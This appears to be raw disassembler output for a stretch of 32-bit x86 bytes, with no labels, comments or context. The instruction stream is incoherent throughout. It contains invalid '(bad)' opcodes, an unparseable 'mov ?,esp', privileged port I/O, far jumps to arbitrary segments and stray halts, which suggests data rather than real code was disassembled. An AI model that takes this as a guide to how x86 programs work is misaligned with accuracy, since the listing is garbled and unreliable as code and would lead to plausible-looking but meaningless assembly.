  41f17b:	mov    edx,0xb0e21570
  41f180:	lods   al,BYTE PTR ds:[esi]
  41f181:	gs jae 0x41f13c
  41f184:	cmp    eax,0xb3b629c7
  41f189:	pop    eax
  41f18a:	inc    ebp
  41f18b:	add    ch,al
  41f18d:	xchg   ecx,eax
  41f18e:	mov    al,ds:0x140c9b37
  41f193:	xchg   esp,eax
  41f194:	jmp    0x33db:0x22f55d73
  41f19b:	aaa    
  41f19c:	jne    0x41f1eb
  41f19e:	xor    BYTE PTR [edi+0x0],dl
	...
  41f1a9:	add    BYTE PTR [eax],al
  41f1ab:	push   ds
  41f1ac:	test   eax,0x7ff735f6
  41f1b1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1b7:	fbstp  TBYTE PTR [edi-0x6c1fa7c4]
  41f1bd:	add    DWORD PTR [eax],eax
  41f1bf:	lods   eax,DWORD PTR ds:[esi]
  41f1c0:	add    BYTE PTR [eax],al
  41f1c2:	add    BYTE PTR [edi],ch
  41f1c4:	arpl   sp,bx
  41f1c6:	xor    BYTE PTR [ecx-0x1ffc84a0],ch
  41f1cc:	mov    DWORD PTR [ecx-0x1f1a21b2],0x1323d3d7
  41f1d6:	and    ebx,DWORD PTR [edi-0x54]
  41f1d9:	imul   edi,DWORD PTR [ecx+0x69],0x35a4c09a
  41f1e0:	sbb    BYTE PTR [ebx+0x70],al
  41f1e3:	adc    bl,BYTE PTR [eax-0x77d23cf3]
  41f1e9:	jbe    0x41f257
  41f1eb:	jmp    0x41f1b9
  41f1ed:	test   al,0xa3
  41f1ef:	cmp    bh,BYTE PTR [eax-0x776231dc]
  41f1f5:	outs   dx,BYTE PTR ds:[esi]
  41f1f6:	push   esi
  41f1f7:	cmp    edx,DWORD PTR [ebp+0x7a]
  41f1fa:	jbe    0x41f1a4
  41f1fc:	imul   ebx,DWORD PTR [edi+eax*1-0xb],0x2308496d
  41f204:	fld    QWORD PTR [esi+0x3d]
  41f207:	in     al,dx
  41f208:	test   eax,0xa1a22f86
  41f20d:	test   DWORD PTR [ecx],ebx
  41f20f:	test   BYTE PTR [edi+0x2ee8e486],al
  41f215:	xchg   edx,eax
  41f216:	jnp    0x41f242
  41f218:	push   esi
  41f219:	ror    BYTE PTR [ebx-0x213b5764],cl
  41f21f:	cmp    eax,0x9765faa9
  41f224:	sbb    BYTE PTR [esi],dh
  41f226:	push   cs
  41f227:	popw   ss
  41f229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f22a:	pop    ecx
  41f22b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f22c:	aam    0x2a
  41f22e:	out    dx,al
  41f22f:	mov    DWORD PTR ds:0x31fc32a1,ecx
  41f235:	jno    0x41f1e9
  41f237:	mov    bl,0xe8
  41f239:	mov    dh,0x5a
  41f23b:	xor    al,BYTE PTR [ebx-0x652392f9]
  41f241:	aaa    
  41f242:	and    eax,0xc584b347
  41f247:	inc    esi
  41f248:	js     0xc6e88f01
  41f24e:	iret   
  41f24f:	lods   al,BYTE PTR ds:[esi]
  41f250:	scas   eax,DWORD PTR es:[edi]
  41f251:	add    bh,BYTE PTR [ebx+0x6c]
  41f254:	mov    eax,esi
  41f256:	sub    BYTE PTR [edx],dl
  41f258:	mov    eax,ds:0xf98dac5e
  41f25d:	dec    ebp
  41f25e:	add    esp,DWORD PTR [ebx-0x35ac8930]
  41f264:	ror    DWORD PTR [ecx],cl
  41f266:	sbb    eax,0xc8ab094
  41f26b:	sub    eax,0x2c91d80e
	...
  41f278:	add    BYTE PTR [eax],al
  41f27a:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  41f280:	lods   eax,DWORD PTR ds:[esi]
  41f281:	fcomi  st,st(7)
  41f283:	sar    BYTE PTR [ebx],cl
  41f285:	(bad)  
  41f286:	add    BYTE PTR [eax-0x79],ah
  41f289:	pop    ss
  41f28a:	mov    ds:0x1948d,al
  41f28f:	lods   eax,DWORD PTR ds:[esi]
  41f290:	add    BYTE PTR [eax],al
  41f292:	add    BYTE PTR [ebx],dl
  41f294:	aaa    
  41f295:	mov    ecx,ebx
  41f297:	daa    
  41f298:	cmp    eax,DWORD PTR [edx+0x301c812d]
  41f29e:	lods   al,BYTE PTR ds:[esi]
  41f29f:	sbb    DWORD PTR [eax+0x67],0xccb7d476
  41f2a6:	clc    
  41f2a7:	in     eax,0x4
  41f2a9:	nop
  41f2aa:	cli    
  41f2ab:	or     al,0x91
  41f2ad:	dec    esi
  41f2ae:	inc    ebp
  41f2af:	fbstp  TBYTE PTR [eax-0x41]
  41f2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2b3:	mov    edx,0x43ef3be5
  41f2b8:	xchg   edi,eax
  41f2b9:	or     ecx,DWORD PTR [ebp+eax*4-0x4b]
  41f2bd:	nop
  41f2be:	in     eax,0x48
  41f2c0:	bound  ebp,QWORD PTR [eax+0x7ae063a7]
  41f2c6:	cmc    
  41f2c7:	inc    esp
  41f2c8:	pop    esp
  41f2c9:	mov    eax,ds:0xfbe26a29
  41f2ce:	mov    ds:0x373b229d,eax
  41f2d3:	out    0x95,eax
  41f2d5:	add    al,0x88
  41f2d7:	cld    
  41f2d8:	jl     0x41f314
  41f2da:	mov    esp,0x9198ee3d
  41f2df:	mov    ah,0x49
  41f2e1:	rcl    bh,0x3a
  41f2e4:	dec    ebp
  41f2e5:	push   0xd12c7025
  41f2ea:	sub    DWORD PTR [eax-0x12930679],edi
  41f2f0:	push   ds
  41f2f1:	lods   al,BYTE PTR ds:[esi]
  41f2f2:	fst    QWORD PTR [ecx-0x46]
  41f2f5:	cmc    
  41f2f6:	xchg   esp,eax
  41f2f7:	xlat   BYTE PTR ds:[ebx]
  41f2f8:	and    al,0xe7
  41f2fa:	dec    ebx
  41f2fb:	sar    ah,cl
  41f2fd:	adc    BYTE PTR [edi+esi*8-0x5fb4b4d2],bh
  41f304:	rcr    DWORD PTR [ecx-0x5cbb3bc4],1
  41f30a:	lock jmp 0x61c0:0xb8852573
  41f312:	push   ds
  41f313:	ja     0x41f2c5
  41f315:	stos   DWORD PTR es:[edi],eax
  41f316:	ret    
  41f317:	or     DWORD PTR [esi-0x760a7d19],esi
  41f31d:	dec    eax
  41f31e:	xor    ch,bh
  41f320:	cmp    BYTE PTR [edi-0x276c42b8],ah
  41f326:	push   esi
  41f327:	daa    
  41f328:	cs jl  0x41f2fd
  41f32b:	js     0x41f35a
  41f32d:	lods   al,BYTE PTR ds:[esi]
  41f32e:	mov    ah,0x95
  41f330:	xchg   ecx,eax
  41f331:	rcl    DWORD PTR ds:0x929916e8,cl
  41f337:	aad    0x9f
  41f339:	jnp    0x41f375
  41f33b:	fnstcw WORD PTR [ecx+0x714faf]
	...
  41f349:	add    BYTE PTR [eax],al
  41f34b:	or     bh,dh
  41f34d:	ja     0x41f399
  41f34f:	dec    edx
  41f351:	cmp    eax,0x2e8eedf7
  41f356:	dec    eax
  41f357:	sar    BYTE PTR [edi-0x6ac54331],0x1
  41f35e:	add    BYTE PTR [ebp-0x41000000],ch
  41f364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f365:	push   esp
  41f366:	arpl   WORD PTR [edx],bx
  41f368:	and    BYTE PTR [ecx],dl
  41f36a:	xchg   DWORD PTR [ebx-0x4b],eax
  41f36d:	ins    BYTE PTR es:[edi],dx
  41f36e:	dec    edx
  41f36f:	mov    cl,0x29
  41f371:	xchg   esi,eax
  41f372:	xchg   BYTE PTR [ebp-0x7c664ca8],ch
  41f378:	cdq    
  41f379:	jg     0x41f3e3
  41f37b:	push   ebp
  41f37c:	sbb    DWORD PTR [eax-0x21c361de],edx
  41f382:	shl    BYTE PTR [ebp+0x73a0f865],0x4e
  41f389:	pop    edx
  41f38a:	out    dx,eax
  41f38b:	icebp  
  41f38c:	mov    DWORD PTR [ebp+0x73cd9f03],edi
  41f392:	sbb    BYTE PTR [edx-0x69545659],ah
  41f398:	mov    ch,0x18
  41f39a:	stos   DWORD PTR es:[edi],eax
  41f39b:	jp     0x41f39e
  41f39d:	jp     0x41f339
  41f39f:	ss int3 
  41f3a1:	push   ebx
  41f3a2:	push   ecx
  41f3a3:	inc    eax
  41f3a4:	sbb    BYTE PTR [ebx-0x6c11f78],dh
  41f3aa:	repz mov bl,0xc
  41f3ad:	sar    DWORD PTR [ebp-0x258e7199],0x45
  41f3b4:	cmp    DWORD PTR [ebx+0x355feb7f],0x5a
  41f3bb:	repz fsubr QWORD PTR [edx-0x4f]
  41f3bf:	xchg   BYTE PTR [ebx+0x7086a5b7],al
  41f3c5:	lods   al,BYTE PTR ds:[esi]
  41f3c6:	xchg   DWORD PTR [ecx],eax
  41f3c8:	ffree  st(4)
  41f3ca:	shr    DWORD PTR [esi],1
  41f3cc:	mov    esp,0xdd6267b9
  41f3d1:	imul   ebp,esp,0x1c
  41f3d4:	repnz mov ch,0x5f
  41f3d7:	and    BYTE PTR [eax+eax*8+0x45],ah
  41f3db:	cwde   
  41f3dc:	or     al,cl
  41f3de:	dec    ebp
  41f3df:	ss jl  0x41f443
  41f3e2:	jb     0x41f36b
  41f3e4:	mov    cl,0x2f
  41f3e6:	lds    esi,FWORD PTR [ebp-0x7894a1d3]
  41f3ec:	sub    al,0xa5
  41f3ee:	addr16 mov eax,0x1fec42fa
  41f3f4:	mul    BYTE PTR [ecx+ebx*2+0x8]
  41f3f8:	hlt    
  41f3f9:	out    dx,eax
  41f3fa:	mov    bh,0xa0
  41f3fc:	or     bh,BYTE PTR [eax+0x16b85de2]
  41f402:	cmc    
  41f403:	and    BYTE PTR [eax+eiz*2],bh
  41f406:	add    eax,0xaa9fecff
  41f40b:	icebp  
  41f40c:	mov    ds:0x847f84,eax
	...
  41f419:	add    BYTE PTR [eax],al
  41f41b:	arpl   WORD PTR ss:[eax-0x10],bp
  41f41f:	jge    0x41f41c
  41f421:	mov    esi,0x8c7853e7
  41f426:	daa    
  41f427:	mov    cl,0xec
  41f429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f42a:	and    edi,esp
  41f42c:	xchg   ebp,eax
  41f42d:	add    DWORD PTR [eax],eax
  41f42f:	lods   eax,DWORD PTR ds:[esi]
  41f430:	add    BYTE PTR [eax],al
  41f432:	add    BYTE PTR [eax-0x4b],dh
  41f435:	cmp    BYTE PTR [eax-0x50],al
  41f438:	shr    edx,cl
  41f43a:	fs hlt 
  41f43c:	or     eax,0x331944a7
  41f441:	mov    BYTE PTR [ebx-0x63a4af12],ah
  41f447:	lock pop ds
  41f449:	je     0x41f48b
  41f44b:	sahf   
  41f44c:	jle    0x41f460
  41f44e:	cmp    al,0xdd
  41f450:	add    al,0x0
  41f452:	jg     0x41f46d
  41f454:	mov    ecx,DWORD PTR [esp+ecx*1-0x6c5b3a78]
  41f45b:	mov    ds:0x6e471865,al
  41f460:	cmp    BYTE PTR [ecx],dl
  41f462:	in     al,dx
  41f463:	or     al,0x17
  41f465:	ss xchg bh,ah
  41f468:	retf   0x1fdd
  41f46b:	enter  0x1e7,0xf2
  41f46f:	inc    esp
  41f470:	xchg   DWORD PTR [ecx-0x27],ebx
  41f473:	rol    BYTE PTR [esi-0x26498c39],cl
  41f479:	add    BYTE PTR [eax+0x5c954c80],dl
  41f47f:	mov    edx,0x5c2845b5
  41f484:	rcr    BYTE PTR [eax+0x33],1
  41f487:	ror    ch,1
  41f489:	fadd   QWORD PTR [edi]
  41f48b:	je     0x41f4f6
  41f48d:	and    dh,al
  41f48f:	push   ds
  41f490:	mov    DWORD PTR [ebx+0x78d2e3f2],eax
  41f496:	or     eax,0x70cc7f5e
  41f49b:	stos   DWORD PTR es:[edi],eax
  41f49c:	mov    al,ds:0x4ff29d3f
  41f4a1:	ins    BYTE PTR es:[edi],dx
  41f4a2:	mov    al,bl
  41f4a4:	and    bl,ch
  41f4a6:	xchg   ecx,eax
  41f4a7:	mov    ebp,0x68befe3c
  41f4ac:	ret    0x7d5b
  41f4af:	xor    BYTE PTR [esi+0x1cf0bfc1],0x76
  41f4b6:	dec    esi
  41f4b7:	ret    
  41f4b8:	int3   
  41f4b9:	and    edx,ebp
  41f4bb:	mov    eax,cs
  41f4bd:	fisubr DWORD PTR [ebx]
  41f4bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4c0:	mov    DWORD PTR [ecx],edi
  41f4c2:	inc    ebx
  41f4c3:	dec    edx
  41f4c4:	out    0xb5,eax
  41f4c6:	js     0x41f497
  41f4c8:	popf   
  41f4c9:	out    0x89,eax
  41f4cb:	sub    edi,ecx
  41f4cd:	es xchg ebx,eax
  41f4cf:	inc    eax
  41f4d0:	jge    0x41f545
  41f4d2:	sbb    DWORD PTR ds:0x5d9bf610,esi
  41f4d8:	inc    eax
  41f4d9:	addr16 sub ah,dl
  41f4dc:	mov    ah,0xd3
  41f4de:	mov    eax,ds:0x8e
	...
  41f4eb:	daa    
  41f4ec:	push   ecx
  41f4ed:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41f4f7:	or     edx,DWORD PTR [esi+0x78]
  41f4fa:	add    bh,BYTE PTR [esi-0x52fffe5e]
  41f500:	add    BYTE PTR [eax],al
  41f502:	add    al,dl
  41f504:	sub    ebp,DWORD PTR [eax]
  41f506:	sahf   
  41f507:	ret    0x26a1
  41f50a:	fisttp DWORD PTR [edx]
  41f50c:	in     eax,0xd9
  41f50e:	arpl   WORD PTR [esi+0x34f4290c],dx
  41f514:	push   cs
  41f515:	imul   ecx,DWORD PTR [esi],0x5d
  41f518:	push   0xffffffab
  41f51a:	mov    ds:0xa1c74a40,al
  41f51f:	push   cs
  41f520:	cmp    edx,DWORD PTR [eax-0x63]
  41f523:	mov    WORD PTR [ebx],ss
  41f525:	cmp    edx,DWORD PTR [ebp+0x77d2dca7]
  41f52b:	addr16 fwait
  41f52d:	loope  0x41f525
  41f52f:	adc    al,0xa9
  41f531:	ins    BYTE PTR es:[edi],dx
  41f532:	mov    dh,0xf8
  41f534:	add    al,0x76
  41f536:	cmp    al,0xba
  41f538:	or     DWORD PTR ds:0x4300967a,0xffffffc8
  41f53f:	sub    eax,0x22ea6793
  41f544:	adc    eax,0x5823ed5e
  41f549:	xor    eax,0xcd436f93
  41f54e:	dec    edx
  41f54f:	stc    
  41f550:	inc    esp
  41f551:	adc    ebp,ebx
  41f553:	stos   BYTE PTR es:[edi],al
  41f554:	or     BYTE PTR ds:0xa5df0140,ah
  41f55a:	mov    BYTE PTR [ebp+0x43095b24],bh
  41f560:	adc    bl,BYTE PTR [esi+0x1a1d084d]
  41f566:	mov    al,ds:0xe4858d34
  41f56b:	ficomp DWORD PTR [edx]
  41f56d:	clc    
  41f56e:	jnp    0x41f54f
  41f570:	js     0x41f50a
  41f572:	test   eax,0x72ece8af
  41f577:	xchg   edx,eax
  41f578:	pop    esp
  41f579:	or     ax,0x8155
  41f57d:	xor    al,0xdf
  41f57f:	push   ebp
  41f580:	jge    0x41f55e
  41f582:	rcl    cl,1
  41f584:	mov    ah,0xda
  41f586:	and    BYTE PTR [ebx+0x5f278641],dl
  41f58c:	jno    0x41f567
  41f58e:	mov    ?,esp
  41f590:	iret   
  41f591:	test   al,0x5b
  41f593:	adc    ah,BYTE PTR [esi+0x5cf9e94b]
  41f599:	pop    ebx
  41f59a:	out    dx,al
  41f59b:	push   esi
  41f59c:	jmp    0x1e11:0xd80c8685
  41f5a3:	xchg   edi,eax
  41f5a4:	test   bl,ah
  41f5a6:	inc    edx
  41f5a7:	or     al,0x4d
  41f5a9:	stos   DWORD PTR es:[edi],eax
  41f5aa:	push   edx
  41f5ab:	sti    
  41f5ac:	jnp    0x41f5ef
  41f5ae:	out    dx,eax
  41f5af:	sbb    al,0x0
	...
  41f5b9:	add    BYTE PTR [eax],al
  41f5bb:	daa    
  41f5bc:	ss lahf 
  41f5be:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f5c4:	and    eax,0xce94075b
  41f5c9:	push   cs
  41f5ca:	cdq    
  41f5cb:	imul   esp,DWORD PTR [ebx+0xad0001],0x0
  41f5d2:	add    BYTE PTR [edi],dh
  41f5d4:	popa   
  41f5d5:	or     cl,cl
  41f5d7:	ja     0x41f5a8
  41f5d9:	ret    
  41f5da:	push   cs
  41f5db:	sbb    BYTE PTR [ebx+0x25df280b],bl
  41f5e1:	outs   dx,BYTE PTR ds:[esi]
  41f5e2:	pop    ds
  41f5e3:	push   ecx
  41f5e4:	push   0xbbf7e155
  41f5e9:	out    dx,al
  41f5ea:	lods   eax,DWORD PTR ds:[esi]
  41f5eb:	mov    ds:0xb737dc27,al
  41f5f0:	xor    al,0xc7
  41f5f2:	sub    bl,ah
  41f5f4:	jnp    0x41f637
  41f5f6:	idiv   BYTE PTR [ecx-0x181f0ef3]
  41f5fc:	cli    
  41f5fd:	js     0x41f63a
  41f5ff:	cs sub eax,0xb203f2e0
  41f605:	xor    al,0x89
  41f607:	iret   
  41f608:	sahf   
  41f609:	and    ah,BYTE PTR [edx+0x21]
  41f60c:	scas   al,BYTE PTR es:[edi]
  41f60d:	push   ebx
  41f60e:	imul   esi,ebp,0xd7a411a7
  41f614:	call   0xd19f:0xd4d0527f
  41f61b:	imul   edi,DWORD PTR [edx+ecx*4],0xffffffcf
  41f61f:	add    bh,cl
  41f621:	in     eax,dx
  41f622:	dec    eax
  41f623:	mov    edi,DWORD PTR [eax+0x4fab550c]
  41f629:	jo     0x41f690
  41f62b:	test   DWORD PTR [edx-0x46],edi
  41f62e:	pop    ds
  41f62f:	arpl   ax,si
  41f631:	in     eax,0x14
  41f633:	add    ch,bl
  41f635:	bnd je 0x41f63f
  41f638:	mov    ds:0x6b3cb024,eax
  41f63d:	(bad)  
  41f63e:	xchg   edx,eax
  41f63f:	adc    al,0x83
  41f642:	call   0xb28897c
  41f647:	pop    ds
  41f648:	dec    ecx
  41f649:	or     DWORD PTR [edx+0x4316150e],esp
  41f64f:	mov    esp,0xbf7e4954
  41f654:	cmp    ah,BYTE PTR [ebx-0x59]
  41f657:	adc    edi,DWORD PTR ds:0xe0f4c14d
  41f65d:	test   DWORD PTR [eax+0x2af9ec4a],edi
  41f663:	outs   dx,BYTE PTR ds:[esi]
  41f664:	(bad)  
  41f666:	cmp    al,0xfb
  41f668:	mov    eax,0x25314bbe
  41f66d:	add    eax,DWORD PTR [ecx+0x678a07be]
  41f673:	and    cl,BYTE PTR [edi]
  41f675:	pushf  
  41f676:	jno    0x41f6ee
  41f678:	jge    0x41f680
  41f67a:	xchg   si,ax
  41f67c:	es jp  0x41f604
  41f67f:	dec    ecx
	...
  41f688:	add    BYTE PTR [eax],al
  41f68a:	add    BYTE PTR [edi],dh
  41f68c:	(bad)  
  41f68d:	out    0xc2,eax
  41f68f:	mul    ebx
  41f691:	aaa    
  41f692:	cmc    
  41f693:	xchg   ecx,eax
  41f694:	call   0x9e2b:0xcca8eef4
  41f69b:	sbb    BYTE PTR [ecx+eax*1+0xad00],ah
  41f6a2:	add    BYTE PTR [edx+ebx*8-0x1a],ah
  41f6a6:	pop    edi
  41f6a7:	mov    ds:0x31bfe0b1,al
  41f6ac:	lods   al,BYTE PTR ds:[esi]
  41f6ad:	dec    edi
  41f6ae:	jl     0x41f6bb
  41f6b0:	and    esp,DWORD PTR [esi-0x10]
  41f6b3:	mov    esp,0xcc64bf74
  41f6b8:	leave  
  41f6b9:	ret    0xf4cd
  41f6bc:	jge    0x41f655
  41f6be:	jl     0x41f6e8
  41f6c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6c1:	inc    esp
  41f6c2:	icebp  
  41f6c3:	iret   
  41f6c4:	push   ss
  41f6c5:	push   edi
  41f6c6:	call   0xbca9:0xef8750c9
  41f6cd:	lahf   
  41f6ce:	scas   eax,DWORD PTR es:[edi]
  41f6cf:	add    al,0x96
  41f6d1:	xlat   BYTE PTR ds:[ebx]
  41f6d2:	xchg   BYTE PTR [eax],bh
  41f6d4:	sub    al,BYTE PTR [edi]
  41f6d6:	add    al,0x6f
  41f6d8:	fstp   DWORD PTR [edi-0x3d1dc93f]
  41f6de:	out    dx,eax
  41f6df:	sub    edx,DWORD PTR [eax+esi*8]
  41f6e2:	adc    dh,BYTE PTR [ebx-0x49]
  41f6e5:	jl     0x41f6ad
  41f6e7:	jb     0x41f6d4
  41f6e9:	into   
  41f6ea:	cmp    ch,ch
  41f6ec:	test   DWORD PTR [edi+0x58],edi
  41f6ef:	(bad)  
  41f6f0:	and    bh,BYTE PTR [eax+0x592ebd69]
  41f6f6:	fcomp  st(7)
  41f6f8:	jbe    0x41f68d
  41f6fa:	out    0xa1,eax
  41f6fc:	in     eax,0xef
  41f6fe:	cmp    ebx,edi
  41f700:	loop   0x41f777
  41f702:	mov    ebp,0xdb80d493
  41f707:	test   eax,0x55b33eeb
  41f70c:	inc    ebp
  41f70d:	sbb    BYTE PTR [edi-0x12],ch
  41f710:	(bad)  
  41f711:	(bad)
  41f715:	xchg   ecx,eax
  41f716:	shl    BYTE PTR [ebx],cl
  41f718:	es dec ecx
  41f71a:	pop    esi
  41f71b:	out    0xb3,al
  41f71d:	jmp    0x6088:0x482ab68a
  41f724:	stos   DWORD PTR es:[edi],eax
  41f725:	xchg   bh,dh
  41f727:	pushf  
  41f728:	inc    eax
  41f729:	repz and bl,cl
  41f72c:	js     0x41f6c8
  41f72e:	je     0x41f784
  41f730:	sub    al,0x6
  41f732:	sbb    eax,0x790449e4
  41f737:	and    esi,ebp
  41f739:	cwde   
  41f73a:	sbb    DWORD PTR [esi+ecx*1+0xd],edx
  41f73e:	fs adc eax,0x8c1d729
  41f744:	fld    st(3)
  41f746:	xchg   ecx,eax
  41f747:	ss sti 
  41f749:	mov    dh,BYTE PTR [eax+edi*2+0x3c47aa5f]
	...
  41f758:	add    BYTE PTR [eax],al
  41f75a:	add    BYTE PTR [esi],dl
  41f75c:	aad    0xdf
  41f75e:	out    dx,eax
  41f75f:	fucomip st,st(7)
  41f761:	ss std 
  41f763:	cmp    BYTE PTR [esi+0x50c85f3a],al
  41f769:	sbb    BYTE PTR ds:0x1a4c5,ch
  41f76f:	lods   eax,DWORD PTR ds:[esi]
  41f770:	add    BYTE PTR [eax],al
  41f772:	add    dh,ch
  41f774:	mov    ds:0xf844954c,eax
  41f779:	(bad)  
  41f77a:	popa   
  41f77b:	stos   BYTE PTR es:[edi],al
  41f77c:	enter  0xce66,0xeb
  41f780:	mov    dh,0xd2
  41f782:	pop    ecx
  41f783:	aam    0x15
  41f785:	stc    
  41f786:	xchg   esi,eax
  41f787:	scas   eax,DWORD PTR es:[edi]
  41f788:	std    
  41f789:	lea    ebp,[ebx]
  41f78b:	inc    edi
  41f78c:	push   ecx
  41f78d:	xchg   edx,eax
  41f78e:	xchg   edx,eax
  41f78f:	stos   BYTE PTR es:[edi],al
  41f790:	call   0x59d9:0xdcbfa026
  41f797:	and    ch,BYTE PTR [ebx-0x906ce73]
  41f79d:	xor    DWORD PTR [ecx],ebp
  41f79f:	dec    ebp
  41f7a0:	call   0xdc71:0xe82121c5
  41f7a7:	sti    
  41f7a8:	sbb    BYTE PTR [edx+0x85d7517],bh
  41f7ae:	pop    esp
  41f7af:	data16 mov ch,0x65
  41f7b2:	les    edi,FWORD PTR [esi+eax*1+0x50e8fc94]
  41f7b9:	mov    bl,0x35
  41f7bb:	xlat   BYTE PTR ds:[ebx]
  41f7bc:	cmp    DWORD PTR [eax-0x9851392],edx
  41f7c2:	xchg   esp,eax
  41f7c3:	sub    al,0x92
  41f7c5:	jp     0x41f833
  41f7c7:	(bad)  
  41f7c8:	rcl    BYTE PTR [ebx],1
  41f7ca:	xchg   ebx,eax
  41f7cb:	repnz icebp 
  41f7cd:	into   
  41f7ce:	jl     0x41f824
  41f7d0:	cdq    
  41f7d1:	mov    fs,ebx
  41f7d3:	neg    DWORD PTR [edx+0x148af3f2]
  41f7d9:	dec    ecx
  41f7da:	ins    BYTE PTR es:[edi],dx
  41f7db:	scas   al,BYTE PTR es:[edi]
  41f7dc:	out    dx,al
  41f7dd:	popf   
  41f7de:	je     0x41f788
  41f7e0:	push   esi
  41f7e1:	jmp    0xab06:0x8299bc74
  41f7e8:	cli    
  41f7e9:	les    esi,FWORD PTR [ebx+0x27e403a4]
  41f7ef:	fidiv  WORD PTR [edx]
  41f7f1:	adc    eax,0x4d372a72
  41f7f6:	inc    esi
  41f7f7:	daa    
  41f7f8:	js     0x41f813
  41f7fa:	jmp    0x41f80d
  41f7fc:	xor    cl,BYTE PTR [esi+0x6e]
  41f7ff:	lods   eax,DWORD PTR ds:[esi]
  41f800:	pop    ecx
  41f801:	xchg   edx,eax
  41f802:	lock or BYTE PTR [eax+0x738b0d1],0x9e
  41f80a:	mov    ch,0xcb
  41f80c:	ja     0x41f816
  41f80e:	add    bl,cl
  41f810:	adc    eax,0x9795f94
  41f815:	jecxz  0x41f867
  41f817:	loope  0x41f81a
  41f819:	jae    0x41f84a
  41f81b:	std    
  41f81c:	xlat   BYTE PTR ds:[ebx]
  41f81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f81e:	xchg   esp,eax
  41f81f:	add    DWORD PTR [eax],eax
	...
  41f829:	add    BYTE PTR [eax],al
  41f82b:	outs   dx,BYTE PTR ds:[esi]
  41f82c:	jbe    0x41f812
  41f82e:	retf   0xdafc
  41f831:	outs   dx,BYTE PTR ds:[esi]
  41f832:	neg    BYTE PTR [eax]
  41f834:	xchg   edx,eax
  41f835:	xchg   DWORD PTR [edi+0x4df66bf5],edx
  41f83b:	jb     0x41f7e2
  41f83d:	add    DWORD PTR [eax],eax
  41f83f:	lods   eax,DWORD PTR ds:[esi]
  41f840:	add    BYTE PTR [eax],al
  41f842:	add    dh,dh
  41f844:	shl    ebx,1
  41f846:	add    DWORD PTR [esi+0x45],edx
  41f849:	jmp    0x2ebf:0x8a2e6003
  41f850:	(bad)  
  41f851:	pop    esi
  41f852:	adc    BYTE PTR [esi+eiz*1],cl
  41f855:	ins    DWORD PTR es:[edi],dx
  41f856:	daa    
  41f857:	mov    al,ds:0x897cfb06
  41f85c:	lahf   
  41f85d:	mov    bl,0xe9
  41f85f:	mov    DWORD PTR [ebx],0x58868d5b
  41f865:	test   eax,0xb979a442
  41f86a:	cwde   
  41f86b:	and    BYTE PTR [ebx-0x218be12d],al
  41f871:	sti    
  41f872:	test   al,0x8e
  41f874:	mov    ebp,0xe4380150
  41f879:	inc    esi
  41f87a:	scas   eax,DWORD PTR es:[edi]
  41f87b:	or     al,0x94
  41f87d:	or     al,0xd9
  41f87f:	xor    DWORD PTR [edx],eax
  41f881:	inc    esi
  41f882:	adc    ebp,DWORD PTR [ebp+eax*4+0x5cc029de]
  41f889:	adc    BYTE PTR [edx],dh
  41f88b:	hlt    
  41f88c:	add    al,0x3e
  41f88e:	(bad)
  41f891:	and    al,0xd7
  41f893:	mov    al,ds:0x5734d5ab
  41f898:	mov    eax,0x64269763
  41f89d:	iret   
  41f89e:	pop    ebx
  41f89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a0:	push   eax
  41f8a1:	adc    al,0xa5
  41f8a3:	mov    esp,0xb1bd98af
  41f8a8:	xor    edi,DWORD PTR [esi]
  41f8aa:	jg     0x41f84e
  41f8ac:	mov    dl,0x60
  41f8ae:	pop    esi
  41f8af:	mov    edi,ecx
  41f8b1:	xchg   ecx,eax
  41f8b2:	ss sub eax,ebp
  41f8b5:	adc    eax,0xe36e9bf4
  41f8ba:	call   0x22bb:0x4d3c7729
  41f8c1:	je     0x41f8d6
  41f8c3:	lock push cs
  41f8c5:	imul   esp,edi,0x2
  41f8c8:	in     al,dx
  41f8c9:	jns    0x41f88d
  41f8cb:	cmp    al,0x53
  41f8cd:	add    al,0x27
  41f8cf:	idiv   DWORD PTR [esi+0x690ddc90]
  41f8d5:	push   es
  41f8d6:	into   
  41f8d7:	jo     0x41f874
  41f8d9:	jno    0x41f889
  41f8db:	sbb    eax,0xce8bb0f9
  41f8e0:	adc    BYTE PTR [ecx],0x33
  41f8e3:	in     eax,dx
  41f8e4:	pop    esi
  41f8e5:	sbb    ebp,ebp
  41f8e7:	loop   0x41f872
  41f8e9:	jmp    0xf71e218d
  41f8ee:	nop
  41f8ef:	pop    esp
	...
  41f8f8:	add    BYTE PTR [eax],al
  41f8fa:	add    BYTE PTR [edx],bh
  41f8fc:	push   edx
  41f8fd:	les    ecx,FWORD PTR [edi]
  41f8ff:	in     al,dx
  41f900:	lahf   
  41f901:	sti    
  41f902:	ja     0x41f8fa
  41f904:	rcl    DWORD PTR [eax-0x96e112d],1
  41f90a:	aaa    
  41f90b:	pop    ds
  41f90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f90d:	add    DWORD PTR [eax],eax
  41f90f:	lods   eax,DWORD PTR ds:[esi]
  41f910:	add    BYTE PTR [eax],al
  41f912:	add    al,bl
  41f914:	or     BYTE PTR [edi-0x664f4243],ch
  41f91a:	sub    al,0x5
  41f91c:	or     al,0x42
  41f91e:	xor    ebp,DWORD PTR [edi+esi*1]
  41f921:	loopne 0x41f8e7
  41f923:	add    eax,0xe8932bc4
  41f928:	in     al,0x6f
  41f92a:	stc    
  41f92b:	mov    ebp,0x13aff865
  41f930:	and    eax,0xda1de42b
  41f935:	and    bl,BYTE PTR [ecx+0x4a]
  41f938:	pop    ss
  41f939:	jo     0x41f94f
  41f93b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f93c:	out    0xbd,eax
  41f93e:	adc    al,0x72
  41f940:	rcr    BYTE PTR [edx],0xb7
  41f943:	mov    eax,ds:0xa6c9005a
  41f948:	adc    al,0x4e
  41f94a:	jle    0x41f96c
  41f94c:	pop    edx
